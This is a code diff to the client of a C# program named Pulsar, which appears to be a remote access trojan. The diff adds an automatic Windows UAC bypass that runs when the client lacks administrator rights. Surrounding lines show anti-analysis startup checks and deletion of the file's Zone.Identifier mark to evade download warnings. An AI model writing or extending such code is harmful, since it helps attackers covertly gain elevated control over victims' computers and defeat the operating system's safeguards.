@@ -1,5 +1,6 @@
 ﻿using Pulsar.Client.Anti;
 using Pulsar.Client.Config;
+using Pulsar.Client.Helper.UAC;
 using Pulsar.Client.Logging;
 using Pulsar.Client.LoggingAPI;
 using Pulsar.Client.Messages;
@@ -10,9 +11,12 @@ using Pulsar.Client.Utilities;
 using Pulsar.Common.DNS;
 using Pulsar.Common.Helpers;
 using Pulsar.Common.Messages;
+using Pulsar.Common.Messages.ClientManagement;
+using Pulsar.Common.UAC;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
@@ -100,6 +104,13 @@ namespace Pulsar.Client
                 Environment.Exit(2);
 
             Manager.StartAnti();
+
+            if (Settings.UACBYPASS && !UAC.IsAdministrator())
+            {
+                Debug.WriteLine("Attempting UAC bypass...");
+                Bypass.DoUacBypass();
+                Environment.Exit(5);
+            }
 
             FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
 
